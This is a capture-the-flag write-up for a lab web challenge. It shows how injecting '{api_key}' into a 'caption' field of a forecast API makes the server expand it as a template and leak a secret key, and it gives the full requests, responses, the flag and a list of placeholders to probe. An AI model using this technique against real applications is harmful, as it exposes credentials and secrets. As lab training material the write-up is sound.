# Shady Oaks Financial - shadyoaks-007 - Can you find the `api_key`?

## Challenge

**Name:** Shady Oaks Financial
**Category:** Web / API
**Objective:** Find the `api_key`

---

## 1. Register an Account

First, register a normal user account on the Shady Oaks Financial application and log in.

After logging in, navigate to the **Forecast** feature.

The application provides two options:

* **Get Forecast**
* **Evaluate Custom Indicator**

The second option is particularly interesting because it allows us to send a custom indicator/formula to the backend.

---

## 2. Inspect the Evaluation Endpoint

Using the browser's Developer Tools or Burp Suite, intercept the request generated when evaluating a custom indicator.

The request is sent to:

```http
POST /api/forecast/indicator
```

Example request:

```http
POST /api/forecast/indicator HTTP/2
Host: lab-1791110761297-7jd86m.labs-app.bugforge.io
Authorization: Bearer <JWT>
Content-Type: application/json
```

The JSON body initially looked like:

```json
{
  "stock_id": 2,
  "formula": "(sma(10) + ema(20)) / 2"
}
```

The server returned:

```json
{
  "stock": {
    "id": 2,
    "symbol": "404EX",
    "name": "The 404 Exchange"
  },
  "formula": "(sma(10) + ema(20)) / 2",
  "value": 142.2839,
  "caption": "{value}"
}
```

The response shows that the server calculates the formula and also processes a `caption` field.

---

## 3. Test the `caption` Parameter

Instead of relying on the default caption, add our own `caption` value.

Use:

```json
{
  "stock_id": 2,
  "formula": "(sma(10) + ema(20)) / 2",
  "caption": "{api_key}"
}
```

Send the request to:

```http
POST /api/forecast/indicator
```

---

## 4. Retrieve the API Key

The server evaluates `{api_key}` as a template variable and substitutes its value into the response.

The response becomes:

```json
{
  "stock": {
    "id": 2,
    "symbol": "404EX",
    "name": "The 404 Exchange"
  },
  "formula": "(sma(10) + ema(20)) / 2",
  "value": 142.2839,
  "caption": "bug{xxab6B2vSpa3FeFzMutjJ1lGOMw46y3K}"
}
```

The `api_key` is therefore exposed through the `caption` template.

---

## Flag

```text
bug{xxab6B2vSpa3FeFzMutjJ1lGOMw46y3K}
```

---

## Vulnerability

The vulnerability is caused by **server-side template interpolation of user-controlled input**.

The `caption` parameter is accepted from the client and processed by the backend as a template rather than being treated as plain text.

Using:

```text
{api_key}
```

causes the server to substitute the value of its internal `api_key` variable into the response.

### Attack Flow

```text
Register/Login
      ↓
Forecast
      ↓
Evaluate Custom Indicator
      ↓
POST /api/forecast/indicator
      ↓
Control the "caption" parameter
      ↓
{api_key}
      ↓
Server-side template interpolation
      ↓
API key exposed
      ↓
Flag
```

## Key Takeaway

When testing an application that accepts user-controlled template-like fields, check whether placeholders such as:

```text
{value}
{api_key}
{secret}
{token}
{username}
```

are interpreted by the server.

In this challenge, the existing `{value}` placeholder in the default caption was the clue that the `caption` field supported server-side variable interpolation.